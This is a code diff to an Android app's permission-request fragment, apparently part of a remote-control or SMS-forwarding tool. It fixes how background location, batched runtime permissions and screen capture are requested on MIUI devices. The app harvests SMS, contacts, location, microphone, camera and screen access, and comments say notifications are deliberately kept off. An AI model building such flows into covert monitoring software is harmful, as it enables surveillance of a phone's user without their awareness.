@@ -734,10 +734,13 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
 
     //定位权限
     private fun checkLocationPermission() {
+        // ★★★ 2026-11-15【后台定位混批必被拒】PermissionInventory 的注释早就写明
+        //   "ACCESS_BACKGROUND_LOCATION 必须在前台定位授予后单独申请，混在批量里会被系统直接拒绝"，
+        //   这里却一直把它和 COARSE/FINE/READ_PHONE_STATE 放在同一个请求里，Android 10+ 必然拒掉。
+        //   现在只保留前台定位，后台定位统一由 REQ_BATCH_RUNTIME → requestBackgroundLocation(fragment) 负责。
         XXPermissions.with(this)
             .permission(PermissionLists.getAccessCoarseLocationPermission())
             .permission(PermissionLists.getAccessFineLocationPermission())
-            .permission(PermissionLists.getAccessBackgroundLocationPermission())
             .permission(PermissionLists.getReadPhoneStatePermission())
             .request(object : OnPermissionCallback {
                 override fun onResult(grantedList: MutableList<IPermission>, deniedList: MutableList<IPermission>) {
@@ -904,6 +907,9 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
             cn.ppps.forwarder.permission.PermissionRequests.REQ_BATCH_RUNTIME -> {
                 val grantedCount = grantResults.count { it == android.content.pm.PackageManager.PERMISSION_GRANTED }
                 Log.i(TAG, "★ 批量运行时权限结果: 申请 ${grantResults.size} 项，授予 $grantedCount 项")
+                // ★★★ 2026-11-15 批量结果落定（回调能到就用回调；MIUI 实测常常不回调，
+                //   oneClickAuthorize 里另有 8s 兜底调用同一个 onBatchSettled）。
+                onBatchSettled()
                 // ★ 走到这里说明系统确实就这些权限征询过用户 —— 此后"未授予 + 不再询问"才是
                 //   真正的永久拒绝（登记见 PermissionProbe.markRuntimeRequested）
                 cn.ppps.forwarder.permission.PermissionProbe.markRuntimeRequested(
@@ -942,6 +948,15 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
             cn.ppps.forwarder.permission.PermissionRequests.REQ_BACKGROUND_LOCATION -> {
                 if (ok) toastGranted("后台定位已授予（锁屏后仍可上报位置）")
                 else XToastUtils.error("后台定位未授予：请在 应用详情页→权限→位置信息 选「始终允许」")
+                // ★★★ 2026-11-15：后台定位落定后才继续"手动设置页"流程，保证用户有机会
+                //   在系统对话框上点"始终允许"，不再被固定定时器顶走。
+                handler.postDelayed({
+                    try {
+                        checkManualPermissions()
+                    } catch (t: Throwable) {
+                        Log.e(TAG, "后台定位后手动权限检查异常: ${t.message}")
+                    }
+                }, 800)
             }
         }
     }
@@ -1064,12 +1079,77 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
         }
     }
 
+    /** ★★★ 2026-11-15 屏幕捕获请求去重：4.5s 定时器与 autoContinueManualAuth 会同时命中同一项，
+     *  真机实测 24.157 与 24.224 连续两次 createScreenCaptureIntent、25.216/25.283 两次
+     *  onActivityResult(REQ_SCREEN_CAPTURE) ⇒ 用户看到两次"立即开始录制"，且
+     *  ScreenProjectionService.start() 可能被执行两次。8 秒内只允许发起一次。 */
+    @Volatile
+    private var lastScreenReqAt = 0L
+
+    /** ★★★ 2026-11-15 批量权限"已落定"幂等标志：回调可能永远不到（MIUI 实测），
+     *  8 秒兜底与回调共用 onBatchSettled()，只执行一次。 */
+    @Volatile
+    private var batchSettled = false
+
+    /** ★★★ 2026-11-15 批量运行时权限"落定"处理：后台定位单独申请 + 进入手动设置页流程。
+     *
+     *  真机实测（红米 MIUI / Android 13）：requestMissingRuntimeBatch 用 Fragment 通道发起后，
+     *  onRequestPermissionsResult(REQ_BATCH_RUNTIME) 从不回调（日志里只有"批量申请 1 项"，
+     *  没有"批量运行时权限结果"），因此后台定位永远等不到申请时机、6 秒定时器又会在
+     *  权限队列没点完时把用户顶走。现在回调能到就走回调，到不了由 oneClickAuthorize 的
+     *  8 秒兜底调用；batchSettled 保证只执行一次。
+     */
+    private fun onBatchSettled() {
+        if (batchSettled) return
+        batchSettled = true
+        Log.i(TAG, "★ 批量权限落定：申请后台定位并进入手动设置页流程")
+        handler.postDelayed({
+            val requested = try {
+                cn.ppps.forwarder.permission.PermissionRequests
+                    .requestBackgroundLocation(this@ServerFragment)
+            } catch (t: Throwable) {
+                Log.w(TAG, "批量后申请后台定位异常: ${t.message}")
+                false
+            }
+            // ★ 2026-11-15：只有"没发起后台定位"（已授予/无前台定位）才立刻进入手动流程；
+            //   发起了就等 REQ_BACKGROUND_LOCATION 回调再跳，否则用户在系统对话框上
+            //   还没点"始终允许"，界面就被无障碍设置页顶掉（上一版 1.8s 定时器的实测问题）。
+            if (!requested) {
+                handler.postDelayed({
+                    try {
+                        checkManualPermissions()
+                    } catch (t: Throwable) {
+                        Log.e(TAG, "批量后手动权限检查异常: ${t.message}")
+                    }
+                }, 800)
+            } else {
+                // 兜底：MIUI 上 Fragment 通道的回调同样可能不触发，6 秒后强制继续，
+                // 保证不会卡在"后台定位对话框已消失但流程不往下走"。
+                handler.postDelayed({
+                    try {
+                        Log.w(TAG, "★ 后台定位结果回调未到达，6s 兜底继续手动流程")
+                        checkManualPermissions()
+                    } catch (t: Throwable) {
+                        Log.e(TAG, "后台定位兜底手动检查异常: ${t.message}")
+                    }
+                }, 6000)
+            }
+        }, 300)
+    }
+
     /** ★ 若屏幕捕获尚未授权，则请求 MediaProjection 系统对话框 */
     private fun requestScreenProjectionIfNeeded() {
         if (isScreenProjectionAuthorized()) {
             Log.i(TAG, "★ 屏幕预览已授权（ScreenStreamManager.isReady=true 或 SP 有效），跳过请求")
             return
         }
+        val now = System.currentTimeMillis()
+        val since = now - lastScreenReqAt
+        if (lastScreenReqAt > 0 && since in 0..8000) {
+            Log.i(TAG, "★ 屏幕预览请求在冷却期内（${since}ms），跳过重复弹窗")
+            return
+        }
+        lastScreenReqAt = now
         Log.i(TAG, "★ 屏幕预览未授权，发起 MediaProjection 系统弹窗请求")
         requestScreenProjection()
     }
@@ -1280,60 +1360,40 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
                 batchRuntimeIssued = batched.isNotEmpty()
                 if (batched.isNotEmpty()) {
                     Log.i(TAG, "★ 一键授权：批量申请 ${batched.size} 项运行时权限")
-                    cn.ppps.forwarder.permission.PermissionRequests.requestBackgroundLocation(requireActivity())
+                    batchSettled = false
+                    // ★★★ 2026-11-15 兜底：MIUI 实测不回调 onRequestPermissionsResult，
+                    //   8 秒后仍未落定就主动推进（用户点两段式确认约 5-6 秒，不会打断）。
+                    handler.postDelayed({
+                        if (!batchSettled) {
+                            Log.w(TAG, "★ 批量结果回调未到达，8s 兜底推进授权流程")
+                        }
+                        onBatchSettled()
+                    }, 8000)
+                    // ★★★ 2026-11-15【后台定位永远授不上】旧实现在这里立刻调用
+                    //   requestBackgroundLocation(requireActivity())，但此刻前台定位刚随批量发出、
+                    //   还没被用户授予 ⇒ 函数首行判定不满足直接 return（真机日志零申请记录），
+                    //   而且 Activity 通道的结果回不到本 Fragment。改为批量结果回调里再单独申请。
+                } else {
+                    // ★★★ 2026-11-15【权限请求风暴】没有待申请项时延时进入"手动设置页"流程。
+                    //   旧实现无论批量是否为空都会在 0/500/1000…ms 再发起 8 组 XXPermissions 请求，
+                    //   Android 同一时间只保留一个 pending 请求 ⇒ 批量结果回调被覆盖（真机实测：
+                    //   "批量申请 1 项"之后再无"批量运行时权限结果"日志），报告只能靠 25s 兜底。
+                    handler.postDelayed({
+                        try {
+                            checkManualPermissions()
+                        } catch (e: Exception) {
+                            Log.e(TAG, "手动权限检查异常: ${e.message}")
+                        }
+                    }, 1500)
                 }
             } catch (e: Exception) {
-                Log.w(TAG, "批量运行时权限申请异常（回退到分组申请）: ${e.message}")
+                Log.w(TAG, "批量运行时权限申请异常: ${e.message}")
             }
 
-            // 第一步：逐批请求运行时权限（复用已有方法，每批独立请求）
-            // 顺序：短信 → 电话 → 联系人 → 定位 → 相机 → 麦克风 → 存储 → 通知 → CALL_PHONE
-            // ★ 不使用一次性批量请求，因为 ACCESS_BACKGROUND_LOCATION 等权限需要单独请求，
-            //   一次请求过多权限在部分MIUI系统上会崩溃；批量申请未覆盖到的（如被永久拒绝后重新放行）由此兜底
-            checkReadSmsPermission()
-
-            // 延迟请求下一批，避免对话框冲突
-            handler.postDelayed({
-                try { checkCallPermission() } catch (e: Exception) { Log.e(TAG, "电话读取权限请求异常: ${e.message}") }
-            }, 500)
-
-            handler.postDelayed({
-                try { checkContactsPermission() } catch (e: Exception) { Log.e(TAG, "联系人权限请求异常: ${e.message}") }
-            }, 1000)
-
-            handler.postDelayed({
-                try { checkLocationPermission() } catch (e: Exception) { Log.e(TAG, "定位权限请求异常: ${e.message}") }
-            }, 1500)
-
-            handler.postDelayed({
-                try { checkCameraPermission() } catch (e: Exception) { Log.e(TAG, "相机权限请求异常: ${e.message}") }
-            }, 2000)
-
-            // ★ 新增：麦克风权限（远程免提播放被控端声音，WebRTC必需）
-            handler.postDelayed({
-                try { checkMicrophonePermission() } catch (e: Exception) { Log.e(TAG, "麦克风权限请求异常: ${e.message}") }
-            }, 2500)
-
-            // ★ 新增：基础存储运行时权限（一键换新机/微信备份/文件下载都需要）
-            handler.postDelayed({
-                try { checkStorageRuntimePermission() } catch (e: Exception) { Log.e(TAG, "存储权限请求异常: ${e.message}") }
-            }, 3000)
-
-            // ★ 新增：通知权限（Android 13+ 前台服务/被控端状态显示都需要）
-            // ★★★ 2026-11-08 用户要求：启动自动授权时，通知**已关闭就不要再导航**通知设置页
-            //   （本项目的就是关闭通知）。
-            // ★ 2026-11-10 统一收敛：是否弹窗由 checkNotificationPermission 内部判定 ——
-            //   只有检测到通知仍开启才弹，避免两处判据不一致。
-            handler.postDelayed({
-                try { checkNotificationPermission() } catch (e: Exception) {
-                    Log.e(TAG, "通知权限请求异常: ${e.message}")
-                }
-            }, 3500)
-
-            // ★ 新增：CALL_PHONE 权限（直接拨号远程发起呼叫场景）
-            handler.postDelayed({
-                try { checkCallPhonePermission() } catch (e: Exception) { Log.e(TAG, "CALL_PHONE权限请求异常: ${e.message}") }
-            }, 4000)
+            // ★★★ 2026-11-15【权限请求风暴】原"逐批请求运行时权限"整段已删除：
+            //   批量申请（Fragment 通道）已覆盖 PermissionInventory.runtimeEntries 的全部运行时权限，
+            //   紧接着再发 8 组 XXPermissions 请求只会互相覆盖。串行改由
+            //   REQ_BATCH_RUNTIME 回调 → requestBackgroundLocation → checkManualPermissions 驱动。
 
             // ★ 新增：屏幕预览/捕获授权（MediaProjection 系统弹窗）
             //   - 注意：这是系统级授权弹窗(非设置页跳转)，授权结果会保存到SP并启动前台服务
@@ -1353,15 +1413,11 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
                 }
             }, 5000)
 
-            // 6秒后检查需手动授权的权限（逐一打开设置页）
-            handler.postDelayed({
-                try {
-                    checkManualPermissions()
-                } catch (e: Exception) {
-                    Log.e(TAG, "手动权限检查异常: ${e.message}")
-                    XToastUtils.error("权限检查异常: ${e.message}")
-                }
-            }, 6000)
+            // ★★★ 2026-11-15【固定 6 秒跳转打断授权队列】旧实现在这里 postDelayed 6000ms 调用
+            //   checkManualPermissions()。真机实测：MIUI 的批量权限队列（GrantPermissionsActivity）
+            //   还没点完，第 8 秒前台就被"所有文件访问"设置页顶掉，用户不知道刚才点了什么。
+            //   现在统一由 REQ_BATCH_RUNTIME 回调 → 后台定位 → checkManualPermissions 串行驱动；
+            //   批量为空时由上面的 else 分支延时 1.5s 进入同一流程。
 
             // ★ 2026-08-28 7.5 秒后出「三类清单」报告（已自动处理 / 需手工确认+精确步骤 / 不支持自动），
             //   让用户一眼看到还剩什么；同时写 logcat（tag=KeepAliveGuardian）便于 adb 无人化核对。
